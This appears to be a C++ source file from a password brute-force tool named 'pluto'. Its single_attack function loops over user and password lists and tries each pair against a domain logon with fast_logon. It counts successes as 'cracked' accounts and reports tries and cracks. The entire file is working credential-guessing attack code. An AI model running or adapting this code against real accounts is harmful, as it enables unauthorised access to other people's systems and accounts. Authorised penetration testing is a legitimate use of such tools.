#include "include/pluto.h"

// Attack from a specific password

void single_attack() {
    // Single user and pass verbose mode
    if (opts->user_source == USER_GIVEN && opts->pass_source == PASS_GIVEN) {
        countdown();
        if (opts->verbose) {
            out_combo(verbose_logon(opts->users->next(), opts->passwords->next(), opts->domain));
        } else {
            bool status = fast_logon(opts->users->next(), opts->passwords->next(), opts->domain);
            out_combo(opts->users->current(), opts->passwords->current(), status);
        }
        return;
    }

    Iterator<char*> *user_it = opts->users;
    Iterator<char*> *pass_it = opts->passwords;

    int tries = 0;
    int users = 0;
    int cracks = 0;
    bool success = false;

    char* user;
    char* pass;
    char* domain = opts->domain;

    countdown();

    // USER LOOP
    while (true) {

        // Next user
        if (!user_it->has_next()) {
            break;
        }
        user = user_it->next();
        users++;

        // Reset password
        pass_it->reset();

        // PASS LOOP
        success = false;
        while (true) {
            // Next pass
            if (!pass_it->has_next()) {
                break;
            }
            pass = pass_it->next();

            // Check enter
            if (isEnter()) {
                return;
            }

            // Try logon
            tries++;
            if (fast_logon(user, pass, domain)) {
                success = true;
                cracks++;
                break; // Next user
            }
        }

        // Out combo
        out_combo(user, pass, success);

        // Skip check
        if (success && opts->stop) {
            break;
        }
    }

    if (user_it->has_next()) {
        outfln("\nStopped. (%i tries, %i/%i cracked)", tries, cracks, users);
    } else {
        outfln("\nDone! (%i tries, %i/%i cracked)", tries, cracks, users);
    }

    user_it->close();
    pass_it->close();
}
